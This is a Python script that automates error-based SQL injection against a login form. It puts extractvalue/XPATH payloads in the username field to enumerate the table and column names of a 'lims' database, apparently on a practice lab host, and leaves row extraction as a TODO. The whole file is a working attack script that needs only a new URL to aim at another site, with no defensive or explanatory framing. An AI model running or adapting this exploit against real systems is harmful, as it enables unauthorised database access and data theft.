import re
import requests
import time



def extract_table_names(response_text):
    # Regex to extract table names in the response by parsing the error
    table_name_pattern = re.compile(r"XPATH syntax error: '([a-zA-Z0-9_]+)'")
    table_names = table_name_pattern.findall(response_text)
    return table_names

def extract_column_names(url, table_name, limit_offset):
    query = f"admin' and extractvalue('<a>ahmed</a>',(select concat('.', (select column_name from information_schema.columns where table_name = '{table_name}' limit {limit_offset}, 1))))='1"
    response = requests.post(url, data={"username": query, "password": "some_password@123"})
    
    if response.status_code != 200:
        print(f"[!] Error: Received non-200 status code {response.status_code} for table {table_name}")
        return []
    
    column_names = extract_table_names(response.text)
    return column_names


def fetch_data(url):
    limit_offset = 0
    table_data = {}

    table_names = []
    while True:
        injection_query = f"admin' and extractvalue('<a>ahmed</a>',(select concat('.', (select table_name from information_schema.tables where table_schema = 'lims' limit {limit_offset}, 1))))='1"
        response = requests.post(url, data={"username": injection_query, "password": "some_password@123"})
        
        if response.status_code != 200:
            print(f"[!] Error: Received non-200 status code {response.status_code}")
            print("[!] This might mean there are no more tables to extract.")
            break
        
        new_table_names = extract_table_names(response.text)
        
        if not new_table_names:
            print("[!] No more table names to be extracted")
            break
        
        table_names.extend(new_table_names)
        limit_offset += 1
    
    for table_name in table_names:
        print(f"\n[*] ##### {table_name} #####")
        

        columns = []
        column_offset = 0
        while True:
            new_columns = extract_column_names(url, table_name, column_offset)
            if not new_columns:
                break
            columns.extend(new_columns)
            column_offset += 1
        
        print(f"[*] Columns: {', '.join(columns)}")

        # TODO: extract each value for each column in the columns variable and print them in a nice table
        
        # Just in case for not flooding the server with a lot of requests
        time.sleep(1)

        # To associate each table with its column (kinda like formatting thing)
        table_data[table_name] = {
            "columns": columns,
        }

    return table_data

if __name__ == "__main__":
    url = "https://livelabs.0x4148.com/lims/login.php"
    table_data = fetch_data(url)
    
    if not table_data:
        print("[!] No more data to be extracted.")
        print("[*] Done extraction for all the data!")

